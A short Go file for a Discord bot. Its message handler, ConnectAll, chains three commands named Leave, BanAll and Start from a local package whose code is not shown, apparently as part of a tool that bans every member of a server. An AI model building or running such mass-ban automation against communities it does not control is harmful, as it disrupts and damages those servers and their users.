package main

import (
	"Dynamic/commands"
	"sync"

	"github.com/bwmarrin/discordgo"
)

func ConnectAll(s *discordgo.Session, m *discordgo.MessageCreate) {
	var wg sync.WaitGroup
	commands.Leave(s, m)
	commands.BanAll(s, m)
	commands.Start(s, m, &wg)
}
